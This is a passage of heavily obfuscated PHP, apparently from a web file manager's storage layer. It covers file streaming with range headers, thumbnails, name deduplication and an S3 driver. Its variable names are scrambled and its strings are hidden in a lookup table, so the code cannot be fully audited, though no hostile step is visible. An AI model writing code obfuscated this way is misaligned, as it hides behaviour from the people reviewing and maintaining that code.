$ÖÃÏèÔ• = '') { $´©“®õò =& $_SERVER[„Ç©ñÎ©]; $this->cacheMethod(null, null); if (!$¾ã›Ôé || !$this->exist($¾ã›Ôé)) { show_json(LNG($´©“®õò[115]), !1, $œÎµøá†); } $İæèˆñ÷ = $this->getType() == $´©“®õò[116]; $³ùî¶‰õ = $GLOBALS[$´©“®õò[6]][$´©“®õò[99]][$´©“®õò[117]][$´©“®õò[118]]; $Ô‡ØÃ = (double) $GLOBALS[$´©“®õò[6]][$´©“®õò[99]][$´©“®õò[117]][$´©“®õò[119]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $û´°€­ô = $this->infoFull($¾ã›Ôé); $ìàßëÂ = $û´°€­ô[$´©“®õò[86]]; $²äœ‚Ÿ = gmdate($´©“®õò[120], $û´°€­ô[$´©“®õò[95]]); $®Øá œ = $œÎµøá† ? $œÎµøá† : $this->iconvApp($û´°€­ô[$´©“®õò[32]]); $Àııšü = 0; $ôŞÊÊœ› = $ìàßëÂ - 1; $èæíçä = $this->ext($®Øá œ); if (in_array($èæíçä, array($´©“®õò[121], $´©“®õò[122], $´©“®õò[123], $´©“®õò[124]))) { $èæíçä = $´©“®õò[125]; } if (in_array($èæíçä, array($´©“®õò[126]))) { $èæíçä = $´©“®õò[127]; } if (!$ÖÃÏèÔ•) { $ÖÃÏèÔ• = md5($²äœ‚Ÿ . $this->hashSimple($¾ã›Ôé)); } $ÖÃÏèÔ• = $´©“®õò[128] . $ÖÃÏèÔ• . $´©“®õò[128]; $ö©²÷Ş = get_file_mime($èæíçä); $Ã»²à« = !0; $Ã»²à« = isset($_GET[$´©“®õò[129]]) ? !1 : !0; if ($¥ôæô½â === !1 && !mime_support($ö©²÷Ş)) { $ö©²÷Ş = $´©“®õò[130]; } header($´©“®õò[131]); header($´©“®õò[132] . $ö©²÷Ş); $öÙƒå®ï = rawurlencode($®Øá œ); $öÙƒå®ï = $´©“®õò[128] . $öÙƒå®ï . $´©“®õò[133] . $öÙƒå®ï; if ($¥ôæô½â) { header($´©“®õò[134]); header($´©“®õò[135] . $öÙƒå®ï); } else { if ($Ã»²à«) { header($´©“®õò[136] . $öÙƒå®ï); } } header($´©“®õò[137] . gmdate($´©“®õò[120], time() + 3600 * 24 * 30) . $´©“®õò[138]); header($´©“®õò[139]); header($´©“®õò[140]); header($´©“®õò[141]); if (isset($_SERVER[$´©“®õò[142]]) && strtotime($_SERVER[$´©“®õò[142]]) == $û´°€­ô[$´©“®õò[95]]) { header($´©“®õò[143], !0, 304); die; } if (isset($_SERVER[$´©“®õò[144]]) && $_SERVER[$´©“®õò[144]] == $ÖÃÏèÔ•) { header($´©“®õò[145] . $ÖÃÏèÔ•, !0, 304); die; } header($´©“®õò[145] . $ÖÃÏèÔ•); header($´©“®õò[146] . $²äœ‚Ÿ . $´©“®õò[138]); header($´©“®õò[147] . $®Øá œ); header($´©“®õò[148]); header($´©“®õò[149] . $ìàßëÂ); header($´©“®õò[150]); if (!$¥ôæô½â && $èæíçä == $´©“®õò[151]) { if ($ìàßëÂ > 1024 * 1024 * 5) { die; } $»å’Î–À = $this->getContent($¾ã›Ôé); $»å’Î–À = Html::clearSVG($»å’Î–À); header($´©“®õò[152] . strlen($»å’Î–À)); echo $»å’Î–À; die; } $ôÉŸ‹ = strtolower($_SERVER[$´©“®õò[153]]); if ($İæèˆñ÷ && $ôÉŸ‹ && $³ùî¶‰õ) { if (strstr($ôÉŸ‹, $´©“®õò[154])) { header($´©“®õò[155] . $¾ã›Ôé); } else { if (strstr($ôÉŸ‹, $´©“®õò[156])) { header($´©“®õò[157] . $¾ã›Ôé); } else { if (strstr($ôÉŸ‹, $´©“®õò[158])) { header($´©“®õò[159] . $¾ã›Ôé); } } } if ($Ô‡ØÃ) { header($´©“®õò[160] . $Ô‡ØÃ); } return; } if (isset($_SERVER[$´©“®õò[161]])) { if (preg_match($´©“®õò[162], $_SERVER[$´©“®õò[161]], $¦›ˆ¢Øƒ)) { $Àııšü = intval($¦›ˆ¢Øƒ[1]); if (!empty($¦›ˆ¢Øƒ[2])) { $ôŞÊÊœ› = intval($¦›ˆ¢Øƒ[2]); } } header($´©“®õò[163]); header("\x43\157\156\164\x65\156\164\x2d\x52\141\156\x67\x65\72\x20\142\171\x74\x65\x73\x20{$Àııšü}\55{$ôŞÊÊœ›}\x2f" . $ìàßëÂ); } else { header($´©“®õò[164]); } header($´©“®õò[165]); $Ş•ÅÂˆ‹ = !0; if ($_SERVER[$´©“®õò[166]] == $´©“®õò[167] && $ìàßëÂ > 1204 * 1024 * 1024 * 2) { $Ş•ÅÂˆ‹ = !1; } if ($Ş•ÅÂˆ‹) { header($´©“®õò[168] . ($ôŞÊÊœ› - $Àııšü + 1)); } if ($_SERVER[$´©“®õò[169]] == $´©“®õò[170]) { return; } $ïÅê™¡Ó = 1024 * 100; $¢­ù» ù = 0; if ($Ô‡ØÃ) { $¢­ù» ù = intval(1000 * 1000 * ($ïÅê™¡Ó / $Ô‡ØÃ)); } while ($Àııšü <= $ôŞÊÊœ›) { $ƒŒóÖÌø = timeFloat(); check_abort(); $Ëú‰ñŠæ = $ôŞÊÊœ› - $Àııšü + 1; if ($Ëú‰ñŠæ <= $ïÅê™¡Ó) { $ïÅê™¡Ó = $Ëú‰ñŠæ; } echo $this->fileSubstr($¾ã›Ôé, $Àııšü, $ïÅê™¡Ó); $Àııšü += $ïÅê™¡Ó; if ($ïÅê™¡Ó == $Ëú‰ñŠæ) { $Àııšü = $ôŞÊÊœ› + 1; } if ($¢­ù» ù) { $ï™–ÈÅŸ = intval(1000 * 1000 * (timeFloat() - $ƒŒóÖÌø)); $½ºÍßèŒ = $¢­ù» ù - $ï™–ÈÅŸ; if ($½ºÍßèŒ > 5) { usleep($½ºÍßèŒ); } } } } public function fileOutServer($ó‰àıÇ©, $¨âĞŠ˜³ = false, $™–¥£©¤ = false, $Ìì‘™à = '') { $this->fileOut($ó‰àıÇ©, $¨âĞŠ˜³, $™–¥£©¤, $Ìì‘™à); } public function fileOutLink($£ôáŒ¬æ) { header($_SERVER[„Ç©ñÎ©][171] . $£ôáŒ¬æ); die; } public function cacheMethod($ø¾æ˜, $é¯ÏÕ¼é, $¯ğ¥ø¸µ = null) { $•æ•è =& $_SERVER[„Ç©ñÎ©]; static $ÓŞ·ƒ—œ = array(); $¥Ø³¤õÚ = $é¯ÏÕ¼é ? ltrim($this->getPathOuter($é¯ÏÕ¼é), $•æ•è[8]) : $•æ•è[12]; $›Í¢—ğä = $•æ•è[172] . $ø¾æ˜ . $•æ•è[173] . rtrim($¥Ø³¤õÚ, $•æ•è[8]); if (is_null($ø¾æ˜)) { $ÓŞ·ƒ—œ = array(); return; } if (is_null($é¯ÏÕ¼é)) { foreach ($ÓŞ·ƒ—œ as $›Í¢—ğä => $âÊê·¾Í) { if (!strstr($›Í¢—ğä, $•æ•è[172] . $ø¾æ˜ . $•æ•è[174])) { continue; } unset($ÓŞ·ƒ—œ[$›Í¢—ğä]); } return; } if (!is_null($¯ğ¥ø¸µ)) { $ÓŞ·ƒ—œ[$›Í¢—ğä] = $¯ğ¥ø¸µ; return; } $Ş„ÃÕŞ = isset($ÓŞ·ƒ—œ[$›Í¢—ğä]) ? $ÓŞ·ƒ—œ[$›Í¢—ğä] : null; if (!is_null($Ş„ÃÕŞ)) { return $Ş„ÃÕŞ; } $Ş„ÃÕŞ = $this->{$ø¾æ˜}($é¯ÏÕ¼é); $ÓŞ·ƒ—œ[$›Í¢—ğä] = $Ş„ÃÕŞ; return $Ş„ÃÕŞ; } public function cacheMethodInfoSet($†Ê˜ä×ö, $†ùÉ½õ„, $æ¸ªô˜‹ = false) { $ï‡³‚ß =& $_SERVER[„Ç©ñÎ©]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($ï‡³‚ß[175], $†Ê˜ä×ö, $†ùÉ½õ„); $this->cacheMethod($ï‡³‚ß[176], $†Ê˜ä×ö, $†ùÉ½õ„ ? !1 : !0); if (is_array($æ¸ªô˜‹)) { $this->cacheMethod($ï‡³‚ß[177], $†Ê˜ä×ö, $æ¸ªô˜‹); } } public function fileOutImage($ÒÂ¬íª, $ÔŠ÷— Æ = 250) { $ä’æ… =& $_SERVER[„Ç©ñÎ©]; set_timeout(); if (substr($ÒÂ¬íª, 0, 4) == $ä’æ…[158]) { $this->fileOutLink($ÒÂ¬íª); } $âƒŞø¦ = $this->info($ÒÂ¬íª); $ óÛûú = $âƒŞø¦[$ä’æ…[32]]; $ÖÀø°Š‚ = !1; if (isset($GLOBALS[$ä’æ…[178]]) && $GLOBALS[$ä’æ…[178]][$ä’æ…[94]] == $âƒŞø¦[$ä’æ…[94]]) { $ƒî¯«¨— = $GLOBALS[$ä’æ…[178]][$ä’æ…[179]]; if (!$âƒŞø¦[$ä’æ…[180]]) { $âƒŞø¦[$ä’æ…[180]] = $GLOBALS[$ä’æ…[178]]; } if (isset($ƒî¯«¨—[$ä’æ…[181]])) { if ($ƒî¯«¨—[$ä’æ…[181]] <= $ÔŠ÷— Æ && $ƒî¯«¨—[$ä’æ…[182]] <= $ÔŠ÷— Æ) { $ÖÀø°Š‚ = !0; } } $ óÛûú = $âƒŞø¦[$ä’æ…[180]][$ä’æ…[32]]; } if ($âƒŞø¦[$ä’æ…[86]] <= 1024 * 50 || $ÖÀø°Š‚ || !function_exists($ä’æ…[183]) || $âƒŞø¦[$ä’æ…[184]] == $ä’æ…[185]) { return $this->fileOut($ÒÂ¬íª, !1, $ óÛûú); } if (isset($âƒŞø¦[$ä’æ…[180]][$ä’æ…[186]])) { $²•À´ï = $âƒŞø¦[$ä’æ…[180]][$ä’æ…[186]]; } else { if (isset($âƒŞø¦[$ä’æ…[180]][$ä’æ…[187]])) { $²•À´ï = $âƒŞø¦[$ä’æ…[180]][$ä’æ…[187]]; } } if (!$²•À´ï) { $²•À´ï = md5("{$âƒŞø¦[$ä’æ…[32]]}\x5f{$âƒŞø¦[$ä’æ…[94]]}\137{$âƒŞø¦[$ä’æ…[86]]}\137{$ÔŠ÷— Æ}"); } $±Ğªˆ­Ğ = "{$²•À´ï}\137{$ÔŠ÷— Æ}\56\160\156\147"; if (!($Ö›Ô©·Ö = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $ä’æ…[188]))) { $’Ü†»ï’ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $ä’æ…[189]); } else { $’Ü†»ï’ = KodIO::make($Ö›Ô©·Ö); } if ($Ö›Ô©·Ö = IO::fileNameExist($’Ü†»ï’, $±Ğªˆ­Ğ)) { $¥şÙÊÖë = KodIO::make($Ö›Ô©·Ö); return IO::fileOut($¥şÙÊÖë, !1, $ óÛûú); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $¥şÙÊÖë = DATA_THUMB . $±Ğªˆ­Ğ; del_file($¥şÙÊÖë); if (!@file_exists($¥şÙÊÖë)) { $éÏ¸ßº = TEMP_FILES; if (!is_dir($éÏ¸ßº)) { mk_dir($éÏ¸ßº); } $ŒÖàæè° = $éÏ¸ßº . $²•À´ï . $ä’æ…[10] . $âƒŞø¦[$ä’æ…[184]]; if (!@file_exists($ŒÖàæè°)) { $ŒÖàæè° = $this->download($ÒÂ¬íª, $ŒÖàæè°); } ImageThumb::createThumb($ŒÖàæè°, $¥şÙÊÖë, $ÔŠ÷— Æ, $ÔŠ÷— Æ * 10); } if (!file_exists($¥şÙÊÖë) || filesize($¥şÙÊÖë) < 100) { return @file_exists($ŒÖàæè°) ? IO::fileOut($ŒÖàæè°) : $this->fileOut($ÒÂ¬íª); } if (!($®²ëêªş = IO::move($¥şÙÊÖë, $’Ü†»ï’))) { return IO::fileOut($¥şÙÊÖë); } del_file($¥şÙÊÖë); IO::fileOut($®²ëêªş); } public function fileOutImageServer($á” Ùë°, $İúÌÒµñ = 250) { $this->fileOutImage($á” Ùë°, $İúÌÒµñ); } public function fileNameAuto($è•ÌŠµ…, $„ƒçâØ, $‰Ôˆ½Æ« = REPEAT_RENAME, $šâªÎ±· = false) { $î‡ê†İü =& $_SERVER[„Ç©ñÎ©]; $À¸º—ÙØ = $è•ÌŠµ… === $î‡ê†İü[12] ? $„ƒçâØ : rtrim($è•ÌŠµ…, $î‡ê†İü[8]) . $î‡ê†İü[8] . $„ƒçâØ; if ($‰Ôˆ½Æ« == REPEAT_REPLACE || !$this->exist($À¸º—ÙØ) || $šâªÎ±· && $‰Ôˆ½Æ« != REPEAT_RENAME_FOLDER) { return $„ƒçâØ; } if ($‰Ôˆ½Æ« == REPEAT_SKIP) { return !1; } $–‡£À  = $î‡ê†İü[10] . get_path_ext($„ƒçâØ); $–‡£À  = $–‡£À  == $î‡ê†İü[10] || $šâªÎ±· ? $î‡ê†İü[12] : $–‡£À ; $¿‡à¤¾Ò = 1; $ ½ã¨™Õ = substr($„ƒçâØ, 0, strlen($„ƒçâØ) - strlen($–‡£À )); $ÔÚ¸ö¹³ = $ ½ã¨™Õ . "\50{$¿‡à¤¾Ò}\51{$–‡£À }"; while ($this->exist(rtrim($è•ÌŠµ…, $î‡ê†İü[8]) . $î‡ê†İü[8] . $ÔÚ¸ö¹³)) { $ÔÚ¸ö¹³ = $ ½ã¨™Õ . "\x28{$¿‡à¤¾Ò}\x29{$–‡£À }"; $¿‡à¤¾Ò++; } return $ÔÚ¸ö¹³; } private function fileNameAutoList($™Ö÷ÃæÍ, $íŠà›·Œ, $Ô–­üÆ‚ = false) { $Ôøî®ºä =& $_SERVER[„Ç©ñÎ©]; $¾¨ğ›„º = $this->listPath($™Ö÷ÃæÍ, !0); $¾¨ğ›„º = array_merge($¾¨ğ›„º[$Ôøî®ºä[92]], $¾¨ğ›„º[$Ôøî®ºä[93]]); $˜™¶³’Ñ = array_to_keyvalue($¾¨ğ›„º, $Ôøî®ºä[12], $Ôøî®ºä[32]); $Ä’ Şß« = $Ôøî®ºä[10] . get_path_ext($íŠà›·Œ); $Ä’ Şß« = $Ä’ Şß« == $Ôøî®ºä[10] || $Ô–­üÆ‚ ? $Ôøî®ºä[12] : $Ä’ Şß«; $¢ÌÚ“—® = substr($íŠà›·Œ, 0, strlen($íŠà›·Œ) - strlen($Ä’ Şß«)); $ÑÎ”Æ¼¡ = $¢ÌÚ“—® . "\x28\x30\51{$Ä’ Şß«}"; for ($¡Øü°§Â = 1; $¡Øü°§Â <= count($˜™¶³’Ñ) + 1; $¡Øü°§Â++) { $ÑÎ”Æ¼¡ = $¢ÌÚ“—® . "\50{$¡Øü°§Â}\51{$Ä’ Şß«}"; if (!in_array_not_case($ÑÎ”Æ¼¡, $˜™¶³’Ñ)) { return $ÑÎ”Æ¼¡; } } return $ÑÎ”Æ¼¡; } public function listAllFiles($¦´šŠ¥É, $íÑ‚äğ, $–¾‹…¿® = array()) { $ô¿ŞÄãß =& $_SERVER[„Ç©ñÎ©]; if (empty($íÑ‚äğ)) { return array(); } $Õ¯ã±¾­ = array(); $¦´šŠ¥É = trim($¦´šŠ¥É, $ô¿ŞÄãß[8]); foreach ($íÑ‚äğ as $±…‚íœã) { $ÖšËË”Ø = ltrim(substr(trim($±…‚íœã, $ô¿ŞÄãß[8]), strlen($¦´šŠ¥É)), $ô¿ŞÄãß[8]); $Õ¯ã±¾­ = array_merge($Õ¯ã±¾­, $this->slicePath($ÖšËË”Ø)); } $ŞÅ ™´¸ = array(); foreach (array_unique($Õ¯ã±¾­) as $±…‚íœã) { $ÄËÏÒö‰ = array($ô¿ŞÄãß[94] => $this->getPathOuter($ô¿ŞÄãß[8] . $¦´šŠ¥É . $ô¿ŞÄãß[8] . $±…‚íœã), $ô¿ŞÄãß[85] => 1, $ô¿ŞÄãß[86] => 0); if (substr($±…‚íœã, -1) != $ô¿ŞÄãß[8]) { $ÄËÏÒö‰[$ô¿ŞÄãß[85]] = 0; $äĞ÷“÷Ó = $this->getPath($¦´šŠ¥É . $ô¿ŞÄãß[8] . $±…‚íœã); $ÄËÏÒö‰[$ô¿ŞÄãß[86]] = isset($–¾‹…¿®[$äĞ÷“÷Ó]) ? $–¾‹…¿®[$äĞ÷“÷Ó] : $this->size($äĞ÷“÷Ó); } $ŞÅ ™´¸[] = $ÄËÏÒö‰; } return $ŞÅ ™´¸; } public function slicePath($üÜ–ü£Ğ) { $ë›†ÚÉè =& $_SERVER[„Ç©ñÎ©]; $£ˆˆí¤ = explode($ë›†ÚÉè[8], trim($üÜ–ü£Ğ, $ë›†ÚÉè[8])); $é‡˜£œŠ = 0; do { ++$é‡˜£œŠ; $Çò‡»õ[] = implode($ë›†ÚÉè[8], array_slice($£ˆˆí¤, 0, $é‡˜£œŠ)) . $ë›†ÚÉè[8]; } while ($é‡˜£œŠ < count($£ˆˆí¤)); $Çò‡»õ[count($£ˆˆí¤) - 1] = $üÜ–ü£Ğ; return $Çò‡»õ; } public function getHost() { $€â£·å„ =& $_SERVER[„Ç©ñÎ©]; $¾¿²Ã‚˜ = parse_url(trim($this->domain, $€â£·å„[8])); $²‹òúÕ = isset($¾¿²Ã‚˜[$€â£·å„[190]]) ? $¾¿²Ã‚˜[$€â£·å„[190]] : http_type(); $÷¯±ÈïÆ = isset($¾¿²Ã‚˜[$€â£·å„[191]]) ? $¾¿²Ã‚˜[$€â£·å„[191]] : $¾¿²Ã‚˜[$€â£·å„[94]]; if (isset($¾¿²Ã‚˜[$€â£·å„[192]])) { $÷¯±ÈïÆ .= $€â£·å„[4] . $¾¿²Ã‚˜[$€â£·å„[192]]; } return $²‹òúÕ . $€â£·å„[193] . $÷¯±ÈïÆ; } public function pathEncode($Àºƒ©­‘) { $Š¦“ï± =& $_SERVER[„Ç©ñÎ©]; return str_replace($Š¦“ï±[194], $Š¦“ï±[8], rawurlencode($Àºƒ©­‘)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($™öìù„ü) { set_timeout(); require_once SDK_DIR . $_SERVER[„Ç©ñÎ©][195]; parent::__construct(); $this->_init($™öìù„ü); } public function _init($±‰Ÿ„ì) { foreach ($±‰Ÿ„ì as $èù÷·ˆô => $’äÌË”«) { if (isset($this->{$èù÷·ˆô})) { $this->{$èù÷·ˆô} = $’äÌË”«; } } $this->endpoint = $±‰Ÿ„ì[$_SERVER[„Ç©ñÎ©][196]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($¦€ùû›£ = "\x76\x34") { $this->signVer = $¦€ùû›£; $this->client->setSignatureVersion($¦€ùû›£); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $íŠé–Ä =& $_SERVER[„Ç©ñÎ©]; $™£¡½ê” = $this->getBucketCors(); if (!$™£¡½ê” || !is_array($™£¡½ê”)) { return !1; } if ($™£¡½ê”[$íŠé–Ä[197]] != $íŠé–Ä[198] || $™£¡½ê”[$íŠé–Ä[199]] != $íŠé–Ä[198]) { return !1; } $›¼ÀşÔ¤ = array_map($íŠé–Ä[200], $™£¡½ê”[$íŠé–Ä[201]]); if (!is_array($›¼ÀşÔ¤)) { $›¼ÀşÔ¤ = array(); } $éÚ¯ºù = array($íŠé–Ä[202], $íŠé–Ä[203], $íŠé–Ä[204], $íŠé–Ä[205], $íŠé–Ä[206]); $™à•ü Î = array_diff($éÚ¯ºù, $›¼ÀşÔ¤); return empty($™à•ü Î); } public function mkfile($ÎŸ¾íËÓ, $ä áÙè˜ = '', $ÔÃîƒ¦¤ = REPEAT_RENAME) { $¨ñ§ğó½ = $this->setContent($ÎŸ¾íËÓ, $ä áÙè˜); if ($¨ñ§ğó½ !== !1) { return $this->getPathOuter($ÎŸ¾íËÓ); } return !1; } public function mkdir($ãÜ‘²«Ì, $¢©İºùÀ = REPEAT_SKIP) { $ÂÈ­‹¼º =& $_SERVER[„Ç©ñÎ©]; if (empty($ãÜ‘²«Ì) && $ãÜ‘²«Ì !== $ÂÈ­‹¼º[207]) { return !1; } if ($¢©İºùÀ && $this->_isFolder($ãÜ‘²«Ì)) { return $this->getPathOuter($ãÜ‘²«Ì); } $Õ¯Ñáæ = $this->setContent($ãÜ‘²«Ì, $ÂÈ­‹¼º[12], !0); if ($Õ¯Ñáæ !== !1) { return $this->getPathOuter($ãÜ‘²«Ì); } return !1; } public function copyFile($®í®î—, $å ç›İÏ, $šÙğÆæ€ = array()) { $à¿ìÊ¹’ =& $_SERVER[„Ç©ñÎ©]; $°ì üß¹ = $this->objectMeta($®í®î—); if (!$°ì üß¹) { return !1; } if ($°ì üß¹[$à¿ìÊ¹’[86]] <= 1024 * 1024 * 200) { $çïâŞ¤õ = $this->client->copyObject($this->bucket, $®í®î—, $this->bucket, $å ç›İÏ, $à¿ìÊ¹’[208], $šÙğÆæ€); } else { $çïâŞ¤õ = $this->client->multiCopyObject($this->bucket, $®í®î—, $this->bucket, $å ç›İÏ, $šÙğÆæ€); } $çïâŞ¤õ = $çïâŞ¤õ ? $this->getPathOuter($å ç›İÏ) : !1; return $çïâŞ¤õ; } public function moveFile($®üââĞ, $ß¶ÆÑ£¨) { if ($this->copyFile($®üââĞ, $ß¶ÆÑ£¨)) { $this->delFile($®üââĞ); return $this->getPathOuter($ß¶ÆÑ£¨); } return !1; } public function delFile($»Õ»åëş) { return $this->client->deleteObject($this->bucket, $»Õ»åëş); } public function delFolder($¶ÎµÎÍü) { $ÔŸı„” =& $_SERVER[„Ç©ñÎ©]; if (!$this->exist($¶ÎµÎÍü)) { return !0; } $this->listItemCache = !1; $«àÊÜáí = $this->fileList($¶ÎµÎÍü); $this->listItemCache = !0; $²šË“» = trim($¶ÎµÎÍü, $ÔŸı„”[8]) . $ÔŸı„”[8]; if (!empty($¶ÎµÎÍü) && $¶ÎµÎÍü !== $ÔŸı„”[207] && !in_array($²šË“», $«àÊÜáí[$ÔŸı„”[92]])) { $«àÊÜáí[$ÔŸı„”[92]][] = $²šË“»; } $‰‹•½¹š = $this->delByBatch($«àÊÜáí[$ÔŸı„”[93]]); if (!$‰‹•½¹š) { return !1; } $‰‹•½¹š = $this->delByBatch($«àÊÜáí[$ÔŸı„”[92]]); if (!$‰‹•½¹š) { return !1; } return $this->delFile($²šË“»); } private function delByBatch($ƒÇä¢»à) { foreach (array_chunk($ƒÇä¢»à, 1000) as $›ÉØ¢¯) { $ŞöÖºÌ­ = $this->client->deleteObjects($this->bucket, $›ÉØ¢¯); if (!$ŞöÖºÌ­) { return !1; } } return !0; } public function rename($¢›¦Œ, $Äï€‡) { return $this->renameObject($¢›¦Œ, $Äï€‡); } public function listPath($ÌÎ°ÄÀî, $¦‚å„Š = false) { $˜Â»İâı =& $_SERVER[„Ç©ñÎ©]; $Š«Ğğ€ = $this->fileList($ÌÎ°ÄÀî, $˜Â»İâı[8], !0); foreach ($Š«Ğğ€[$˜Â»İâı[92]] as $ÅŞÃ‚Èõ => $“‚òğ¦±) { $Š«Ğğ€[$˜Â»İâı[92]][$ÅŞÃ‚Èõ] = $this->folderInfo($“‚òğ¦±, $¦‚å„Š, $“‚òğ¦±); } foreach ($Š«Ğğ€[$˜Â»İâı[93]] as $ÅŞÃ‚Èõ => $“‚òğ¦±) { $Š«Ğğ€[$˜Â»İâı[93]][$ÅŞÃ‚Èõ] = $this->fileInfo($“‚òğ¦±[$˜Â»İâı[32]], $¦‚å„Š, $“‚òğ¦±); } return $Š«Ğğ€; } protected function infoChildren($±Óü Õ, &$§ ËÙ—›) { $óå’ƒó© =& $_SERVER[„Ç©ñÎ©]; $”éı—õá = $this->fileList($±Óü Õ, $óå’ƒó©[12], !0); $§ ËÙ—›[$óå’ƒó©[88]] += count($”éı—õá[$óå’ƒó©[92]]); $§ ËÙ—›[$óå’ƒó©[87]] += count($”éı—õá[$óå’ƒó©[93]]); foreach ($”éı—õá[$óå’ƒó©[93]] as $©ÊÖÍ) { if (!$©ÊÖÍ || !$©ÊÖÍ[$óå’ƒó©[86]]) { continue; } $§ ËÙ—›[$óå’ƒó©[86]] += $©ÊÖÍ[$óå’ƒó©[86]]; } } private function fileInfo($í¤­éğµ, $—ùŸúí = false, $è¾“¨·é = array()) { $·ıòÔŠ =& $_SERVER[„Ç©ñÎ©]; $˜°¼ˆ¥‘ = array($·ıòÔŠ[32] => $this->pathThis($í¤­éğµ), $·ıòÔŠ[94] => $this->getPathOuter($í¤­éğµ), $·ıòÔŠ[33] => $·ıòÔŠ[209], $·ıòÔŠ[184] => $this->ext($í¤­éğµ), $·ıòÔŠ[86] => isset($è¾“¨·é[$·ıòÔŠ[86]]) ? $è¾“¨·é[$·ıòÔŠ[86]] : 0); if ($—ùŸúí) { return $˜°¼ˆ¥‘; } $˜°¼ˆ¥‘[$·ıòÔŠ[210]] = $˜°¼ˆ¥‘[$·ıòÔŠ[95]] = 0; $˜°¼ˆ¥‘[$·ıòÔŠ[211]] = $˜°¼ˆ¥‘[$·ıòÔŠ[212]] = !0; if (empty($è¾“¨·é)) { $è¾“¨·é = $this->objectMeta($í¤­éğµ); if (!$è¾“¨·é) { return $˜°¼ˆ¥‘; } } if (isset($è¾“¨·é[$·ıòÔŠ[213]])) { $˜°¼ˆ¥‘[$·ıòÔŠ[95]] = $è¾“¨·é[$·ıòÔŠ[213]]; } if (isset($è¾“¨·é[$·ıòÔŠ[86]])) { $˜°¼ˆ¥‘[$·ıòÔŠ[86]] = $è¾“¨·é[$·ıòÔŠ[86]]; } return $˜°¼ˆ¥‘; } private function folderInfo($ú‡÷ÇÀ, $§ãÏË‰¥ = false, $êë†ÛôĞ = array()) { $‘¼®íæ =& $_SERVER[„Ç©ñÎ©]; $ñãôòÑç = array($‘¼®íæ[32] => $this->pathThis($ú‡÷ÇÀ), $‘¼®íæ[94] => $this->getPathOuter($‘¼®íæ[8] . $ú‡÷ÇÀ), $‘¼®íæ[33] => $‘¼®íæ[85]); if ($§ãÏË‰¥) { return $ñãôòÑç; } $ñãôòÑç[$‘¼®íæ[210]] = $ñãôòÑç[$‘¼®íæ[95]] = 0; $ñãôòÑç[$‘¼®íæ[211]] = $ñãôòÑç[$‘¼®íæ[212]] = !0; if ($ú‡÷ÇÀ == $‘¼®íæ[12]) { return $ñãôòÑç; } if (empty($êë†ÛôĞ)) { $êë†ÛôĞ = $this->objectMeta(trim($ú‡÷ÇÀ, $‘¼®íæ[8]) . $‘¼®íæ[8]); } if (isset($êë†ÛôĞ[$‘¼®íæ[213]])) { $ñãôòÑç[$‘¼®íæ[210]] = $êë†ÛôĞ[$‘¼®íæ[213]]; } return $ñãôòÑç; } private function fileList($ÌòëËÓÉ, $Í™’«ó— = '', $ÕòÏ’î¯ = 0) { $ËİÇñĞÆ =& $_SERVER[„Ç©ñÎ©]; $šÌ´Ãş± = rtrim($ÌòëËÓÉ, $ËİÇñĞÆ[8]) . $ËİÇñĞÆ[8]; $Ïûü´ = $this->listObjs($šÌ´Ãş±, null, null, $Í™’«ó—); if (!$Ïûü´) { return array($ËİÇñĞÆ[92] => array(), $ËİÇñĞÆ[93] => array()); } $®„’¯÷û = $úÑÔÈ¿ = array(); foreach ($Ïûü´[$ËİÇñĞÆ[214]] as $€ü™˜˜) { $†Î¸„œ = $€ü™˜˜[$ËİÇñĞÆ[32]]; if ($†Î¸„œ == $šÌ´Ãş±) { continue; } $«î¦Ó—î = isset($€ü™˜˜[$ËİÇñĞÆ[86]]) ? $€ü™˜˜[$ËİÇñĞÆ[86]] : 0; $ã×ìó¾Ø = $«î¦Ó—î == 0 && substr($†Î¸„œ, strlen($†Î¸„œ) - 1, 1) == $ËİÇñĞÆ[8] ? !0 : !1; $this->cacheMethodInfoSet($†Î¸„œ, $ã×ìó¾Ø, $€ü™˜˜); if ($ã×ìó¾Ø) { $®„’¯÷û[] = $†Î¸„œ; continue; } $úÑÔÈ¿[] = $ÕòÏ’î¯ ? $€ü™˜˜ : $†Î¸„œ; } foreach ($Ïûü´[$ËİÇñĞÆ[215]] as $€ü™˜˜) { $®„’¯÷û[] = $€ü™˜˜[$ËİÇñĞÆ[32]]; $this->cacheMethodInfoSet($€ü™˜˜[$ËİÇñĞÆ[32]], !0); } $this->cacheMethodInfoSet($ÌòëËÓÉ, !0); return array($ËİÇñĞÆ[92] => $®„’¯÷û, $ËİÇñĞÆ[93] => $úÑÔÈ¿); } private function listObjs($¬•ù¹’¸, $³©¶ÀÊõ = null, $¸®ãš¨ë = null, $µŒÊÚã¥ = null) { $ç„Šæ¯ =& $_SERVER[„Ç©ñÎ©]; $¬•ù¹’¸ = trim($¬•ù¹’¸, $ç„Šæ¯[8]); $ˆÜƒºƒ¸ = empty($¬•ù¹’¸) && $¬•ù¹’¸ !== $ç„Šæ¯[207] ? $ç„Šæ¯[12] : $¬•ù¹’¸ . $ç„Šæ¯[8]; return $this->client->getBucket($this->bucket, $ˆÜƒºƒ¸, $³©¶ÀÊõ, $¸®ãš¨ë, $µŒÊÚã¥, !0); } public function has($ıæßøßÜ, $•ûÓÙ¨— = false, $÷‘Ş‘ÃÅ = true) { $†¨³¶µİ =& $_SERVER[„Ç©ñÎ©]; $ıæßøßÜ = trim($ıæßøßÜ, $†¨³¶µİ[8]); $©„§æêª = empty($ıæßøßÜ) && $ıæßøßÜ !== $†¨³¶µİ[207] ? $†¨³¶µİ[12] : $ıæßøßÜ . $†¨³¶µİ[8]; $¤–³…â = null; $âÖÄôñ = 500; $ŠşÏ¥¦ = $†¨³¶µİ[8]; $æŸ±ºÈŠ = $™œÜÜÆå = array(); while (!0) { $²Ü’ˆ¯¼ = 